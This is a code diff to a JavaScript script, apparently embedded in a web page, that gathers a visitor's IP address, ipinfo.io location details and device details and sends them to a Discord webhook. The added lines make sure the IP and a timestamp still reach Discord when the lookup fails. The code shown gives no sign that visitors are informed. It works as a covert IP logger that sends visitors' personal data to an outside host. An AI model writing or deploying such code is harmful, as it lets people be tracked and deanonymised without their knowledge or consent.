@@ -17,6 +17,7 @@ async function fetchIP() {
         await fetchIPInfo(userIp);
     } catch (error) {
         console.error('Error fetching IP address:', error);
+        sendToDiscord(`IP Information at ${getCurrentTimestamp()}:\nIP: Unable to fetch IP info`);
     }
 }
 
@@ -50,6 +51,8 @@ async function fetchIPInfo(ip) {
         await sendToDiscord(ipDetails);
     } catch (error) {
         console.error('Error fetching IP information:', error);
+        // If ipinfo.io fails, just send the IP address and timestamp
+        sendToDiscord(`IP Information at ${getCurrentTimestamp()}:\nIP: ${ip} - Unable to fetch full IP details`);
     }
 }
 
@@ -78,24 +81,26 @@ function getDeviceDetails() {
     };
 }
 
+// Get current timestamp in Central Time (Oklahoma timezone)
+function getCurrentTimestamp() {
+    return new Date().toLocaleString('en-US', {
+        timeZone: 'America/Chicago', // Central Time Zone
+        hour12: true,               // 12-hour clock (AM/PM)
+        year: 'numeric',            // Full year
+        month: 'long',              // Full month name
+        day: 'numeric',             // Day of the month
+        hour: 'numeric',            // Hour (1-12)
+        minute: 'numeric',          // Minutes (00-59)
+        second: 'numeric',          // Seconds (00-59)
+    });
+}
+
 // Send the IP address, device, and other information to Discord using the webhook
 async function sendToDiscord(ipDetails) {
     try {
-        // Get the current timestamp in Central Time (Oklahoma timezone)
-        const timestamp = new Date().toLocaleString('en-US', {
-            timeZone: 'America/Chicago', // Central Time Zone
-            hour12: true,               // 12-hour clock (AM/PM)
-            year: 'numeric',            // Full year
-            month: 'long',              // Full month name
-            day: 'numeric',             // Day of the month
-            hour: 'numeric',            // Hour (1-12)
-            minute: 'numeric',          // Minutes (00-59)
-            second: 'numeric',          // Seconds (00-59)
-        });
-
-        // Create the payload with the timestamp, IP, and device details
+        // Create the payload with the IP details and timestamp
         const payload = {
-            content: `IP Information at ${timestamp}:\n${ipDetails}`, // The message sent to the Discord channel
+            content: ipDetails, // The message sent to the Discord channel
         };
 
         const response = await fetch(discordWebhookUrl, {
